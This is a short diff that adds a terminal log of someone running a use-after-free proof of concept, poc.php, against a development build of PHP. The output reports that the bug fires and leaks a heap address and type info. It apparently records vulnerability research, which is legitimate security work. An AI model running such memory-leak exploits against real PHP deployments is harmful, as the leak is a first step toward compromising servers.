@@ -1,0 +1,8 @@
+or4nge@localhost:~/mcp/uaf_poc$ ~/php-src/sapi/cli/php ./poc.php
+[*] Starting UAF Leak PoC...
+[*] PHP Version: 8.6.0-dev
+[-] Attempt 1...
+[+] SUCCESS! UAF Triggered.
+[+] String index: 2, Length: 100
+[*] Leaked Address at offset 0: 0x766f38048c40
+[*] Type Info: 0x307
